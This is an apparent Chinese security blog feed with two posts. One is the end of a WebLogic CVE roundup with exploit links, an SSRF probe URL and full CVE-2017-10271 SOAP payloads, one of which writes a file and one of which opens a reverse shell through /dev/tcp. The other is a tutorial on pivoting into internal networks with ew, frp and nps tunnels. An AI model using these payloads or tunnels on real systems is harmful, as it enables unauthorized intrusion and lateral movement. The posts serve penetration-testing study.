class="line-numbers-rows"><span></span></span></code></pre><p> <img src="https://img.ex1t.xyz//CVE-2018-2894-6.png" alt="CVE-2018-2894-6"></p><h3 id="2-4-5、CVE-2018-2893（Weblogic-WLS核心组件反序列化漏洞）"><a href="#2-4-5、CVE-2018-2893（Weblogic-WLS核心组件反序列化漏洞）" class="headerlink" title="2.4.5、CVE-2018-2893（Weblogic WLS核心组件反序列化漏洞）"></a>2.4.5、CVE-2018-2893（Weblogic WLS核心组件反序列化漏洞）</h3><h4 id="（1）、介绍-17"><a href="#（1）、介绍-17" class="headerlink" title="（1）、介绍"></a>（1）、介绍</h4><p>​        此漏洞产生于WebLogic的T3服务，因此可通过控制T3协议的访问来临时阻断针对该漏洞的攻击。当开放WebLogic控制台端口（默认为7001端口）时，T3服务会默认开启。</p><h4 id="（2）、影响版本-17"><a href="#（2）、影响版本-17" class="headerlink" title="（2）、影响版本"></a>（2）、影响版本</h4><pre class="line-numbers language-none"><code class="language-none">10.3.6.012.1.3.012.2.1.212.2.1.3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="（3）、利用-17"><a href="#（3）、利用-17" class="headerlink" title="（3）、利用"></a>（3）、利用</h4><pre class="line-numbers language-none"><code class="language-none">https://github.com/ryanInf/CVE-2018-2893<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-4-6、CVE-2018-2628（Weblogic-WLS-Core-Components-反序列化命令执行漏洞）"><a href="#2-4-6、CVE-2018-2628（Weblogic-WLS-Core-Components-反序列化命令执行漏洞）" class="headerlink" title="2.4.6、CVE-2018-2628（Weblogic WLS Core Components 反序列化命令执行漏洞）"></a>2.4.6、CVE-2018-2628（Weblogic WLS Core Components 反序列化命令执行漏洞）</h3><h4 id="（1）、介绍-18"><a href="#（1）、介绍-18" class="headerlink" title="（1）、介绍"></a>（1）、介绍</h4><h4 id="（2）、影响版本-18"><a href="#（2）、影响版本-18" class="headerlink" title="（2）、影响版本"></a>（2）、影响版本</h4><pre class="line-numbers language-none"><code class="language-none">10.3.6.012.2.1.212.2.1.312.1.3.010.3.6.012.2.1.212.2.1.312.1.3.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="（3）、利用-18"><a href="#（3）、利用-18" class="headerlink" title="（3）、利用"></a>（3）、利用</h4><p>POC</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/shengqi158/CVE-2018-2628<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-5、其他年份"><a href="#2-5、其他年份" class="headerlink" title="2.5、其他年份"></a>2.5、其他年份</h2><pre class="line-numbers language-none"><code class="language-none">WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）Weblogic 反序列化漏洞 CVE-2017-3506Weblogic 反序列化漏洞 CVE-2017-3248Weblogic SSRF漏洞 CVE-2014-4210<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-5-1、CVE-2017-10271（WebLogic-XMLDecoder反序列化漏洞）"><a href="#2-5-1、CVE-2017-10271（WebLogic-XMLDecoder反序列化漏洞）" class="headerlink" title="2.5.1、CVE-2017-10271（WebLogic XMLDecoder反序列化漏洞）"></a>2.5.1、CVE-2017-10271（WebLogic XMLDecoder反序列化漏洞）</h3><h4 id="（1）、介绍-19"><a href="#（1）、介绍-19" class="headerlink" title="（1）、介绍"></a>（1）、介绍</h4><p>​        通过构建发送post请求，使用精心构造的xml数据造成任意代码执行</p><h4 id="（2）、影响版本-19"><a href="#（2）、影响版本-19" class="headerlink" title="（2）、影响版本"></a>（2）、影响版本</h4><pre class="line-numbers language-none"><code class="language-none">10.3.6.0.012.1.3.0.012.2.1.1.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="（3）、利用-19"><a href="#（3）、利用-19" class="headerlink" title="（3）、利用"></a>（3）、利用</h4><p>初步判断</p><pre class="line-numbers language-none"><code class="language-none">ip/wls-wsat/CoordinatorPortType11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>存在下图则说明可能存在漏洞</p><p> <img src="https://img.ex1t.xyz//CVE-2017-10271-1.png" alt="CVE-2017-10271-1"></p><pre class="line-numbers language-none"><code class="language-none">写入文件，ip/wls-wsat/test.txtPOST /wls-wsat/CoordinatorPortType HTTP/1.1Host: 192.168.8.148:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Upgrade-Insecure-Requests: 1Content-Type: text/xmlContent-Length: 756&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;      &lt;soapenv:Header&gt;        &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;         &lt;java version="1.6.0" class="java.beans.XMLDecoder"&gt;                    &lt;object class="java.io.PrintWriter"&gt;                         &lt;string&gt;servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt&lt;/string&gt;&lt;void method="println"&gt;                        &lt;string&gt;test(写入内容)&lt;/string&gt;&lt;/void&gt;&lt;void method="close"/&gt;                    &lt;/object&gt;            &lt;/java&gt;        &lt;/work:WorkContext&gt;      &lt;/soapenv:Header&gt;      &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;反弹shell（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）：&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; &lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt;&lt;void class="java.lang.ProcessBuilder"&gt;&lt;array class="java.lang.String" length="3"&gt;&lt;void index="0"&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index="1"&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index="2"&gt;&lt;string&gt;bash -i &gt;&amp; /dev/tcp/接收shell的ip/8888 0&gt;&amp;1&lt;/string&gt; &lt;/void&gt;&lt;/array&gt;&lt;void method="start"/&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-5-2、CVE-2017-3506（Weblogic-反序列化漏洞）"><a href="#2-5-2、CVE-2017-3506（Weblogic-反序列化漏洞）" class="headerlink" title="2.5.2、CVE-2017-3506（Weblogic 反序列化漏洞）"></a>2.5.2、CVE-2017-3506（Weblogic 反序列化漏洞）</h3><h4 id="（1）、介绍-20"><a href="#（1）、介绍-20" class="headerlink" title="（1）、介绍"></a>（1）、介绍</h4><p>​        一个XML的反序列化漏洞导致的命令执行。</p><h4 id="（2）、影响版本-20"><a href="#（2）、影响版本-20" class="headerlink" title="（2）、影响版本"></a>（2）、影响版本</h4><pre class="line-numbers language-none"><code class="language-none">10.3.6.012.1.3.012.2.1.012.2.1.112.2.1.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="（3）、利用-20"><a href="#（3）、利用-20" class="headerlink" title="（3）、利用"></a>（3）、利用</h4><p>详细讲解</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/bit4woo/code2sec.com/blob/master/weblogic%E6%BC%8F%E6%B4%9ECVE-2017-3506%E5%A4%8D%E7%8E%B0%EF%BC%9AWeb%20Services%E6%A8%A1%E5%9D%97%E7%9A%84%E6%BC%8F%E6%B4%9E.md<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-5-3、CVE-2017-3248"><a href="#2-5-3、CVE-2017-3248" class="headerlink" title="2.5.3、CVE-2017-3248"></a>2.5.3、CVE-2017-3248</h3><p>（1）、介绍</p><p>参考文章</p><pre class="line-numbers language-none"><code class="language-none">https://blog.csdn.net/caiqiiqi/article/details/84246779<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）、影响版本</p><pre class="line-numbers language-none"><code class="language-none">10.3.6.0，12.1.3.012.2.1.012.2.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>（3）、利用</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/quentinhardy/scriptsAndExploits<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-5-4、CVE-2014-4210（Weblogic-SSRF漏洞-）"><a href="#2-5-4、CVE-2014-4210（Weblogic-SSRF漏洞-）" class="headerlink" title="2.5.4、CVE-2014-4210（Weblogic SSRF漏洞 ）"></a>2.5.4、CVE-2014-4210（Weblogic SSRF漏洞 ）</h3><h4 id="（1）、介绍-21"><a href="#（1）、介绍-21" class="headerlink" title="（1）、介绍"></a>（1）、介绍</h4><p>​        SSRF（Server-Side Request Forgery），服务端请求伪造，是一种由攻击者构造形成由服务端发起请求的一个漏洞，一般情况下，SSRF攻击的目标是从外部网络无法访问的内部系统。</p><h4 id="（2）、影响版本-21"><a href="#（2）、影响版本-21" class="headerlink" title="（2）、影响版本"></a>（2）、影响版本</h4><pre class="line-numbers language-none"><code class="language-none">10.0.2.0 10.3.6.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="（3）、利用-21"><a href="#（3）、利用-21" class="headerlink" title="（3）、利用"></a>（3）、利用</h4><p>漏洞位置在uddiexplorer下的SearchPublicRegistries.jsp处</p><pre class="line-numbers language-none"><code class="language-none">http://ip:7001//uddiexplorer/SearchPublicRegistries.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="https://img.ex1t.xyz//CVE-2014-4210-1.png" alt="CVE-2014-4210-1"></p><p>访问</p><pre class="line-numbers language-none"><code class="language-none">http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问后显示404说明存在该漏洞</p><p> <img src="https://img.ex1t.xyz//CVE-2014-4210-2.png" alt="CVE-2014-4210-2"></p><p>通过burg抓包查看相关的返回信息</p><p>返回该信息说明开放了7001端口</p><p> <img src="https://img.ex1t.xyz//CVE-2014-4210-3.png" alt="CVE-2014-4210-3"></p><p>返回</p><p>返回could not connect over HTTP to server，说明不存在此端口</p><h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>​        本文是对Weblogic漏洞的整理，大量信息来源于互联网，如有侵权请告知删除、除了其中的部分内容通过实践证明了，其余部分我并没有实践，所以仅供参考。关于文章中包含的poc或者工具我已全部下载，但没有验证是否存在问题。若需要，可在公众号（诚默的每周学习总结）回复关键词：weblogic，得到下载地址。</p><p>​        以上内容仅供学习交流。</p>]]></content>
      
      
      
        <tags>
            
            <tag> weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网穿透总结</title>
      <link href="/2021/08/02/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%80%BB%E7%BB%93/"/>
      <url>/2021/08/02/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="一、渗透测试中的内网穿透"><a href="#一、渗透测试中的内网穿透" class="headerlink" title="一、渗透测试中的内网穿透"></a>一、渗透测试中的内网穿透</h1><p>​        当两个不同网络环境的机器想要互相访问的时候，这个时候外网的机器无法单方面的访问内网的机器。所以我们要借助内网穿透工具（配置进内网的流量隧道）进行访问。</p><p>​        攻击者在成功入侵某一台对外服务器后也会利用以上代理原理进行内网横向渗透进一步扩大战果，上传代理工具至对外服务器将其改造为跳板机，建立通往内网的通信隧道。</p><h1 id="二、内网穿透常用工具"><a href="#二、内网穿透常用工具" class="headerlink" title="二、内网穿透常用工具"></a>二、内网穿透常用工具</h1><pre class="line-numbers language-none"><code class="language-none">ew、frp、nps、reGeorg、Proxifier(socks5客户端)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-1、ew"><a href="#2-1、ew" class="headerlink" title="2.1、ew"></a>2.1、ew</h2><h3 id="2-1-1、介绍"><a href="#2-1-1、介绍" class="headerlink" title="2.1.1、介绍"></a>2.1.1、介绍</h3><p>​        ew 全称是EarchWorm，是⼀套轻量便携且功能强⼤的⽹络穿透⼯具，基于标准C开发，具有socks5 代理、端⼝转发和端⼝映射三⼤功能，可在复杂⽹络环境下完成⽹络穿透，且⽀持全平台 (Windows/Linux/Mac)。该⼯具能够以“正向”、“反向”、“多级级联”等⽅式打通⼀条⽹络隧道，直达⽹络 深处，⽤蚯蚓独有的⼿段突破⽹络限制，给防⽕墙松⼟。</p><h3 id="2-1-2、语法："><a href="#2-1-2、语法：" class="headerlink" title="2.1.2、语法："></a>2.1.2、语法：</h3><p>ew有六种模式，分别是：</p><pre class="line-numbers language-none"><code class="language-none">ssocksd：是⽤于普通⽹络环境下的正向连接rcsocks ：⽤于反向连接。rssocks：⽤于反向连接。lcx_slave：⽤于复杂⽹络环境的多级连接。lcx_listen ：⽤于复杂⽹络环境的多级连接。lcx_tran：⽤于复杂⽹络环境的多级连接。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>常⽤参数 </p><pre class="line-numbers language-none"><code class="language-none">-l：指定要监听的本地端⼝-d：指定要反弹到的机器 ip-e：指定要反弹到的机器端⼝-f：指定要主动连接的机器 ip-g：指定要主动连接的机器端⼝-t：指定超时时⻓,默认为 1000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-2-3、实际使用"><a href="#2-2-3、实际使用" class="headerlink" title="2.2.3、实际使用"></a>2.2.3、实际使用</h3><p>当我们拿下了一台目标机器，存在内网。那我们就要建立一条隧道，然后通过代理进去</p><p>当目标机器有公网ip的话</p><pre class="line-numbers language-none"><code class="language-none">VPS：./ew -s rcsocks -l 1080 -e 888  目标机器：./ew -s ssocksd -l 1080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们设置代理为目标ip:888，就能让我们的流量进入对方主机中</p><p>大部分为没有公网ip的情况</p><p>（1）、端口映射</p><p>在VPS上执行，监听本地的999端口</p><pre class="line-numbers language-none"><code class="language-none">ew.exe -s ssocksd -l 999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再服务器A上执行如下命令，将VPS的888端口和服务器的999端口连接起来</p><pre class="line-numbers language-none"><code class="language-none">./ew -s lcx_slave -d 1.1.1.1 -e 888 -f 192.168.10.128 -g 3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>远程桌面连接1.1.1.1:888就是在连接服务器A(192.168.10.128)的3389端口</p><p>（2）、搭建Socks隧道</p><p>1、将VPS的1080端口监听的流量转发到888端口</p><p>2、然后让目标机器主动连接我们vps的888端口</p><p>3、然后我们设置代理为vps的1080端口，那我们从1080端口走的流量就可以转发到888再到目标机器中</p><pre class="line-numbers language-none"><code class="language-none">VPS：./ew -s rcsocks -l 1080 -e 888  目标机器：./ew -s rssocks -d 1.1.1.1 -e 888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）、二级代理</p><p><img src="https://img.ex1t.xyz//2jdl.png" alt="2jdl"></p><p>存在vps、主机A、主机B、服务器C:80（web服务），web网站是主机A映射到公网地址提供web服务</p><p>A、B、C只有A通外网，A只能访问B，B能访问A、C，C只有B能访问。</p><p>那我们要怎样才能直接访问C的服务呢</p><p>在vps上开启监听，将VPS的1088端口的流量转发给888端口</p><p><code>./ew -s lcx_listen -l 1080 -e 888</code></p><p>在B上执行，监听本地的999端口</p><p><code>ew.exe -s ssocksd -l 999</code></p><p>再服务器A上执行如下命令，将VPS的888端口和服务器B的999端口连接起来</p><p><code>./ew -s lcx_slave -d ip(vps) -e 888 -f ip(主机B) -g 999</code></p><p>这样就将A作为中转，将VPS的888端口的流量，发给主机B的999端口。</p><p>我们设置代理为vps的1080端口，就可以直接走B的流量。然后访问C的地址就可以了。</p><p>（4）、三级代理</p><p><img src="https://img.ex1t.xyz//3jdl.png" alt="3jdl"></p><p>与二级代理比多了个主机D，挡在B和服务器C之间</p><p>只有D能访问服务器C的web服务</p><p>首先，在VPS上执行如下命令，将1080端口监听的流量都转发到本地的888端口</p><pre class="line-numbers language-none"><code class="language-none">VPS：./ew -s rcsocks -l 1080 -e 888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后在主机A上执行如下命令，作为中转将VPS的888端口和内网主机B的999端口连接起来</p><pre class="line-numbers language-none"><code class="language-none">主机A：./ew -s lcx_slave -d ip(VPS) -e 888 -f ip(主机B) -g 999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接着在主机B上执行如下命令，将监听的999端口的流量都转发给本地的777端口</p><pre class="line-numbers language-none"><code class="language-none">主机B：ew.exe -s lcx_listen -l 999 -e 777<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后再主机D上执行如下命令，反弹流量到主机B的777端口</p><pre class="line-numbers language-none"><code class="language-none">主机D：./ew -s rssocks -d ip(主机B) -e 777<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置代理为vps的1080端口后</p><pre class="line-numbers language-none"><code class="language-none">VPS:1080-&gt;888-&gt;B:999-&gt;777-&gt;D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就此流量从D走，能够访问服务器C的web服务了</p><h2 id="2-2-frp"><a href="#2-2-frp" class="headerlink" title="2.2 frp"></a>2.2 frp</h2><h3 id="2-2-1、介绍"><a href="#2-2-1、介绍" class="headerlink" title="2.2.1、介绍"></a>2.2.1、介绍</h3><p>​        frp 是一个高性能的反向代理应用，支持 tcp, udp, http, https 协议。支持MAC、Windows、Linux。</p><p>​        frpc是我们的客户端 ，frps是我们的服务端。 frpc.ini是我们的客户端配置文件 。frps.ini是我们的服务端配置文件。</p><h3 id="2-2-2、参数介绍"><a href="#2-2-2、参数介绍" class="headerlink" title="2.2.2、参数介绍"></a>2.2.2、参数介绍</h3><p>简单的配置</p><p>frps.int</p><pre class="line-numbers language-none"><code class="language-none">[common]  bind_port = 11111      #绑定的端⼝ dashboard_port = 22222 #管理端⼝  dashboard_user = root  #管理的⽤户名  dashboard_pwd = 123456 #管理⽤户的密码 token = 1q2w3e         #客户端服务端连接的密码  heartbeat_timeout = 90 #⼼跳超时时间  max_pool_count = 5     #最⼤同时连接数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>frpc.ini</p><pre class="line-numbers language-none"><code class="language-none">[common]  server_addr = 1.1.1.1  #服务器地址 server_port = 11111    #服务器端口 token = 1q2w3e         #服务器连接密码 [test]                 #连接名 type=tcp               #协议 local_ip = 127.0.0.1   #需要被代理的ip local_port = 3389      #需要被代理的端口 remote_port = 3389     #映射到服务端的端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-2-3、实际使用-1"><a href="#2-2-3、实际使用-1" class="headerlink" title="2.2.3、实际使用"></a>2.2.3、实际使用</h3><p>ubuntu启动服务端</p><pre class="line-numbers language-none"><code class="language-none">frps -c frps.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后访问服务器ip:管理端口，输入管理账号和密码进入页面</p><p><img src="https://img.ex1t.xyz//frp1.png" alt="frp1"></p><p>可以看到现在是没有任何端口映射的</p><p><img src="https://img.ex1t.xyz//frp2.png" alt="frp2"></p><p>（1）、端口映射</p><p>接下来我打算将我的windows虚拟机的3389端口，映射到我的公网服务器上的10000端口上面‘</p><p>那我需要怎么配置呢</p><pre class="line-numbers language-none"><code class="language-none">[common]  server_addr = 1.1.1.1  #服务器地址 server_port = 11111    #服务器端口 token = 1q2w3e         #服务器连接密码 [虚拟机win10]                 #连接名 type=tcp               #要建立tcp连接 local_ip = 127.0.0.1   #需要被代理的ip， local_port = 3389      #需要被代理的端口 remote_port = 10000     #映射到服务端的端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后</p><pre class="line-numbers language-none"><code class="language-none">frpc.exe -c frpc.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样服务器端就出现了</p><p><img src="https://img.ex1t.xyz//frp3.png" alt="frp3"></p><p>远程连接我服务端的ip:10000，成功提示我输入账号密码</p><p> <img src="https://img.ex1t.xyz//frp4.png" alt="frp4"></p><p>断开后就提示离线了</p><p><img src="https://img.ex1t.xyz//frp5.png" alt="frp5"></p><p>在内网的其他机器上，映射我虚拟机的3389端口</p><p>就把ip从127.0.0.1改成我的虚拟机ip（ 192.168.107.129）就可以了，端口也改下</p><pre class="line-numbers language-none"><code class="language-none">[common]  server_addr = 1.1.1.1  #服务器地址 server_port = 11111    #服务器端口 token = 1q2w3e         #服务器连接密码 [虚拟机win10-2]                 #连接名 type=tcp               #协议 local_ip = 192.168.107.129   #需要被代理的ip， local_port = 3389      #需要被代理的端口 remote_port = 10001     #映射到服务端的端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功</p><p><img src="https://img.ex1t.xyz//frp6.png" alt="frp6"></p><p>（2）、建立socks5隧道</p><p><code>frpc.exe -c frpc.ini</code></p><pre class="line-numbers language-none"><code class="language-none">[common] server_addr = 1.1.1.1#连接的服务器ip server_port = 11111 #连接的服务器端口 token=1q2w3e         #连接的服务器密钥 pool_count = 5  #同时连接数 protocol = tcp  #协议类型 health_check_type = tcp health_check_interval_s = 100 [test] remote_port = 10000 plugin = socks5 use_encryption = true #是否加密  use_compression = true plugin_user= admin     plugin_passwd= admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我们本机设置socks5代理为：1.1.1.1的10000端口即可。</p><p>这样我们就能够直接上内网了。</p><p>（3）、二级代理</p><p><img src="https://img.ex1t.xyz//2jdl.png" alt="2jdl"></p><p>还是这种情况，怎么让流量从主机B走呢</p><p>通过主机A做跳板，让socks代理建设到内网C主机中</p><p>思路是通过将主机A既作服务端，也做客户端</p><p>就不设置多的东西了</p><p>主机B的frpc.ini设置</p><pre class="line-numbers language-none"><code class="language-none">[common] server_addr = 主机A的ip#连接的服务器ip server_port = 11111 #链接的服务器端口 token=1q2w3e    [test] remote_port = 10000 plugin = socks5 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主机B建立个socks5隧道到主机A的10000端口上</p><p>然后主机A的服务器端frps.ini配置</p><pre class="line-numbers language-none"><code class="language-none">[common]  bind_port = 11111      #绑定的端⼝ dashboard_port = 22222 #管理端⼝  dashboard_user = root  #管理的⽤户名  dashboard_pwd = 123456 #管理⽤户的密码 token = 1q2w3e         #客户端服务端连接的密码  heartbeat_timeout = 90 #⼼跳超时时间  max_pool_count = 5     #最⼤同时连接数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主机A的frpc.ini配置</p><pre class="line-numbers language-none"><code class="language-none">[common]  server_addr = 1.1.1.1  #服务器地址 server_port = 11111    #服务器端口 token = 1q2w3e         #服务器连接密码 [test]                 #连接名 type=tcp               #协议 local_ip = 主机B-ip   #需要被代理的iplocal_port = 10000      #需要被代理的端口 remote_port = 10001     #映射到服务端的端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>A的10000端口就映射到VPS服务端的10001端口上了</p><p>我们再设置代理为VPS:10001，走的就是主机B的流量。</p><p>（4）、三级代理</p><p><img src="https://img.ex1t.xyz//3jdl.png" alt="3jdl"></p><p>将主机D上建立一个socks5隧道 到 主机B的10000端口</p><p><code>D socks5—&gt;B:10000</code></p><p>再将主机B的10000端口映射到 主机A的10001端口</p><p><code>B:10000—&gt;A:10001</code></p><p>主机A再将10001端口映射到VPS的10002端口即可</p><p><code>A:10001—&gt;VPS:10002</code></p><h2 id="2-3、nps"><a href="#2-3、nps" class="headerlink" title="2.3、nps"></a>2.3、nps</h2><h3 id="2-3-1、介绍"><a href="#2-3-1、介绍" class="headerlink" title="2.3.1、介绍"></a>2.3.1、介绍</h3><p>​        nps是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端。</p><p>官网文档：<a href="https://ehang-io.github.io/nps/#/">https://ehang-io.github.io/nps/#/</a></p><h3 id="2-3-2、参数介绍"><a href="#2-3-2、参数介绍" class="headerlink" title="2.3.2、参数介绍"></a>2.3.2、参数介绍</h3><p>服务端启动</p><p>下载完服务器压缩包后，解压，然后进入解压后的文件夹</p><p>执行安装命令</p><p>linux</p><pre class="line-numbers language-none"><code class="language-none">sudo ./nps install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对于windows，管理员身份运行cmd，进入安装目录</p><pre class="line-numbers language-none"><code class="language-none">nps.exe install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>nps默认配置文件使用了80，443，8080，8024端口</p><p>80与443端口为域名解析模式默认端口 8080为web管理访问端口 8024为网桥端口，用于客户端与服务器通信</p><p>启动</p><p>对于linux|darwin </p><pre class="line-numbers language-none"><code class="language-none">sudo nps start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对于windows，管理员身份运行cmd，进入程序目录 </p><pre class="line-numbers language-none"><code class="language-none">nps.exe start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>windows配置文件位于 C:\Program Files\nps</p><p>linux和darwin位于/etc/nps</p><p>主要是配置文件中要改一改，尤其是账号密码</p><p>/conf/nps.conf</p><p> <img src="https://img.ex1t.xyz//nps1.png" alt="nps1"></p><h3 id="2-3-3、实际使用"><a href="#2-3-3、实际使用" class="headerlink" title="2.3.3、实际使用"></a>2.3.3、实际使用</h3><p>192.168.31.146启动服务端</p><pre class="line-numbers language-none"><code class="language-none">sudo nps start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问：192.168.31.146:8080</p><p>默认密码：admin/123</p><p>进入主界面</p><p><img src="https://img.ex1t.xyz//nps2.png" alt="nps2"></p><p>添加客户端：192.168.31.163</p><p><img src="https://img.ex1t.xyz//nps3.png" alt="nps3"></p><p>通过下面的命令启动客户端，记得使用管理员cmd</p><pre class="line-numbers language-none"><code class="language-none">npc.exe -server=192.168.31.146:8024 -vkey=ss5hr5jqny68k18s -type=tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功上线</p><p><img src="https://img.ex1t.xyz//nps4.png" alt="nps4"></p><p>（1）、端口映射</p><p>点击右方的隧道</p><p><img src="https://img.ex1t.xyz//nps5.png" alt="nps5"></p><p>将我本机的3389端口映射到服务器的8888端口，那么远程连接服务器的8888端口，就是本机的3389</p><p><img src="https://img.ex1t.xyz//nps6.png" alt="nps6"></p><p>添加成功</p><p><img src="https://img.ex1t.xyz//nps7.png" alt="nps7"></p><p>然后连接：服务器:8888即可成功。</p><p>之前是成功了，但是没截图。后面本机的远程桌面出了点问题，就不截图了。</p><p>在实际运用中，服务端部署在公网VPS上即可。</p><p>（2）、socks代理</p><p><img src="https://img.ex1t.xyz//nps8.png" alt="nps8"></p><p>设置客户端ID和端口即可</p><p><img src="https://img.ex1t.xyz//nps9.png" alt="nps9"></p><p>然后设置代理为服务器:989即可。</p><p>（3）、二级代理</p><p><img src="https://img.ex1t.xyz//2jdl.png" alt="2jdl"></p><p>首先主机A作为服务端，主机B作为客户端</p><p>建立一个socks隧道到主机A的989端口。</p><p>VPS作为服务端，主机A作为客户端</p><p>映射A的989端口到VPS的10000端口</p><p>设置代理为VPS:10000，就能访问到C的web服务了</p><p>（4）、三级代理</p><p><img src="https://img.ex1t.xyz//3jdl.png" 